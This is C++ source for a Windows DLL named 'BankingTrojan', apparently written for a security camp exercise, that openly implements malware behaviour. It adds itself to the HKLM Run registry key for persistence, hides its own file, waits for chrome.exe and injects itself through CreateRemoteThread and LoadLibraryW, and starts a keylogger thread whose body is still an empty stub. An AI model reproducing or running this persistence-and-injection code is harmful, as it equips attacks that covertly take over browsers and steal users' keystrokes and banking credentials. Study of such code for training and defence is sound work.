/*
	BankingTrojan
	Author:Dinlon5566
	Email:  admin@dinlon5566.com

	This project is for "TeamT5 Security Camp 2025 實作題目" only.
*/

#include "pch.h"
#include "Windows.h"
#include <iostream>
#include <tlhelp32.h>
#include <psapi.h>    // GetModuleBaseNameW function
#include <processthreadsapi.h>
#include <wchar.h>

#define DEBUG 1

const wchar_t dllName[] = L"BankingTrojan.dll";
const wchar_t targetProcessName[] = L"chrome.exe";

// Check if the current user is an administrator
bool isUserAdmin() {	// from MDMZ_Book.pdf
	bool isElevated = false;
	HANDLE token;
	TOKEN_ELEVATION elev;
	DWORD size;
	if (OpenProcessToken(GetCurrentProcess(),
		TOKEN_QUERY, &token)) {
		if (GetTokenInformation(token, TokenElevation,
			&elev, sizeof(elev), &size)) {
			isElevated = elev.TokenIsElevated;
		}
	}
	if (token) {
		CloseHandle(token);
		token = NULL;
	}
	return isElevated;
}


bool writeRegedit(const wchar_t* dllPath) {
	// start command:
	// rundll32 "C:\dev\BankingTrojan\x64\Debug\BankingTrojan.dll", StartBankingTrojan
	// rundll32 BankingTrojan.dll, StartBankingTrojan
	const wchar_t* valueName = L"BankingTrojan";
	const wchar_t* regPath = L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
	//const wchar_t* regValue = L"C:\\Windows\\System32\\rundll32.exe \"C:\\dev\\BankingTrojan\\x64\\Debug\\BankingTrojan.dll\", StartBankingTrojan";
	std::wstring regLValue = L"C:\\Windows\\System32\\rundll32.exe \"" + std::wstring(dllPath) + L"\", StartBankingTrojan";
	const wchar_t* regValue = regLValue.c_str();


	HKEY hKey;
	LONG result = RegOpenKeyExW(HKEY_LOCAL_MACHINE, regPath, 0, KEY_SET_VALUE, &hKey);
	if (result != ERROR_SUCCESS)
	{
		return false;
	}

	result = RegSetValueExW(hKey, valueName, 0, REG_SZ, reinterpret_cast<const BYTE*>(regValue), (wcslen(regValue) + 1) * sizeof(wchar_t));
	if (result != ERROR_SUCCESS)
	{
		RegCloseKey(hKey);
		return false;
	}

	RegCloseKey(hKey);
	return true;
}

bool IsProcessRunning(const wchar_t* processName, DWORD* PID = 0)
{
	bool exists = false;
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapshot != INVALID_HANDLE_VALUE)
	{
		PROCESSENTRY32W pe;
		pe.dwSize = sizeof(PROCESSENTRY32W);

		if (Process32FirstW(hSnapshot, &pe))
		{
			do
			{
				if (_wcsicmp(pe.szExeFile, processName) == 0)
				{
					exists = true;
					*PID = pe.th32ProcessID;
					break;
				}
			} while (Process32NextW(hSnapshot, &pe));
		}
		CloseHandle(hSnapshot);
	}
	return exists;
}



bool DLLinject(DWORD pid, const wchar_t* dllPath) {
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (hProcess == NULL)
	{
		//CloseHandle(hProcess); //  0
		return false;
	}

	LPVOID pDllPath = VirtualAllocEx(hProcess, NULL, (wcslen(dllPath) + 1) * sizeof(wchar_t), MEM_COMMIT, PAGE_READWRITE);
	if (pDllPath == NULL)
	{
		CloseHandle(hProcess);
		return false;
	}

	SIZE_T bytesWritten;
	if (!WriteProcessMemory(hProcess, pDllPath, dllPath, (wcslen(dllPath) + 1) * sizeof(wchar_t), &bytesWritten))
	{
		VirtualFreeEx(hProcess, pDllPath, 0, MEM_RELEASE);
		CloseHandle(hProcess);
		return false;
	}

	HMODULE hKernel32 = GetModuleHandleW(L"Kernel32.dll");
	if (hKernel32 == NULL)
	{
		VirtualFreeEx(hProcess, pDllPath, 0, MEM_RELEASE);
		CloseHandle(hProcess);
		return false;
	}

	LPTHREAD_START_ROUTINE pLoadLibraryW = reinterpret_cast<LPTHREAD_START_ROUTINE>(GetProcAddress(hKernel32, "LoadLibraryW"));
	if (pLoadLibraryW == NULL)
	{
		VirtualFreeEx(hProcess, pDllPath, 0, MEM_RELEASE);
		CloseHandle(hProcess);
		return false;
	}

	HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, pLoadLibraryW, pDllPath, 0, NULL);
	if (hThread == NULL)
	{
		VirtualFreeEx(hProcess, pDllPath, 0, MEM_RELEASE);
		CloseHandle(hProcess);
		return false;
	}

	WaitForSingleObject(hThread, INFINITE);

	VirtualFreeEx(hProcess, pDllPath, 0, MEM_RELEASE);
	CloseHandle(hThread);
	CloseHandle(hProcess);

	return true;
}

bool TrojanLoader(const wchar_t* dllPath) {
	// Decrypt target process name
	/*
	wchar_t targetProcessName[] = L"ja{fdl'lql";
	DWORD pid = 0;
	for (size_t i = 0; i < wcslen(targetProcessName); i++) {
		targetProcessName[i] ^= 0x09;
	}
	*/
	// Wait for the target process to start
	DWORD targetPID = 0;
	const DWORD waitInterval = 1000;
	while (!IsProcessRunning(targetProcessName, &targetPID))
	{
		Sleep(waitInterval);
	}

	// Inject the DLL into the target process
	DLLinject(targetPID, dllPath);
	return true;
}


bool getDLLPath(wchar_t* DLLPath) {
	HMODULE hModule = NULL;
	if (GetModuleHandleEx(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS, (LPCTSTR)&getDLLPath, &hModule))
	{
		if (DEBUG && GetModuleFileName(hModule, DLLPath, MAX_PATH) > 0)
		{
			MessageBox(NULL, DLLPath, L"getDLLPath", MB_OK);
			return true;
		}
	}
	return false;
}


// Do noting
void debug_hold() {
	while (true) {
		Sleep(1000);
	}
}

int hideDll(const wchar_t* dllPath) {
	// I think this is useless XD
	SetFileAttributesW(dllPath, FILE_ATTRIBUTE_HIDDEN);
	// Inject to explorer.exe

	return 0;

}

bool keyloggerMain(wchar_t* DLLPath) {
	HINSTANCE g_hInstance = NULL;
	HHOOK g_hHook = NULL;
	HWND g_hWnd = NULL;

	return 1;
}

DWORD WINAPI KeyloggerMainThread(LPVOID lpParam)
{
	wchar_t DLLPath[MAX_PATH];
	if (DEBUG&&!getDLLPath(DLLPath)) {
		MessageBoxW(NULL, L"Fail to get DLL path", L"KeyloggerMainThread", MB_OK);
		return 0;
	}

	keyloggerMain(DLLPath);
	return 0;
}

int chromeMain() {

	// New thread for keyloggerMain
	HANDLE hThread = CreateThread(
		NULL,
		0,
		KeyloggerMainThread,
		NULL,
		0,
		NULL
	);



	debug_hold();
	return 1;
}

DWORD WINAPI ChromeMainThread(LPVOID lpParam)
{
	chromeMain();
	return 0;
}


// First entry point
extern "C" __declspec(dllexport) void CALLBACK StartBankingTrojan(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow)
{
	wchar_t dllPath[MAX_PATH];
	if (DEBUG && !getDLLPath(dllPath)) {
		MessageBoxW(NULL, L"Fail to get DLL path", L"StartBankingTrojan", MB_OK);
		return;
	}

	// Register key first
	if (isUserAdmin()) {
		writeRegedit(dllPath);
	}
	else if(DEBUG){
		MessageBoxW(NULL, L"Please run as administrator\nRun without admin now ", L"BankingTrojan", MB_OK);
	}

	// hideDll
	hideDll(dllPath);

	TrojanLoader(dllPath);

	ExitProcess(0);
}


BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{

	HANDLE hProcess = GetCurrentProcess();
	wchar_t processName[MAX_PATH] = L"<unknown>";
	HANDLE hThread = NULL;
	DWORD threadId = 0;

	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
	{
		HANDLE hProcess = GetCurrentProcess();
		wchar_t processName[MAX_PATH] = L"<unknown>";
		wchar_t exploreName[] = L"explorer.exe";
		if (GetModuleBaseNameW(hProcess, NULL, processName, MAX_PATH))
		{
			if (_wcsicmp(processName, targetProcessName) == 0) {
				// New thread for chromeMain
				hThread = CreateThread(
					NULL,
					0,
					ChromeMainThread,
					NULL,
					0,
					&threadId
				);

				if (hThread == NULL) {
					// fail to create thread
				}
			}
			else if (_wcsicmp(processName, exploreName) == 0)
			{
				// todo
			}
		}
	}

	break;
	case DLL_THREAD_ATTACH:
		break;
	case DLL_THREAD_DETACH:
		break;
	case DLL_PROCESS_DETACH:
	{
		if (hThread != NULL) {
			// Terminate thread( Wait DETACH)
			WaitForSingleObject(hThread, INFINITE);
			CloseHandle(hThread);
			hThread = NULL;
		}
	}
	break;
	}
	return TRUE;
}

